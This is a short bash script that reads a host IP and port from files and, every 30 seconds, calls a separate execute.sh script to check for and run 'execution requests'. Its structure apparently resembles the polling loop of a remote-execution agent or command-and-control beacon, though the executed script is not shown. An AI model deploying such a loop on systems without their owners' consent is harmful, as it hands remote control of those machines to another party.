#!/bin/bash
IP=$(cat ip.txt)
PORT=$(cat port.txt)
SLEEP_TIME=30

while :; do
	echo "Checking for execution requests"
	$(pwd)/execute.sh $IP $PORT
	sleep $SLEEP_TIME
done
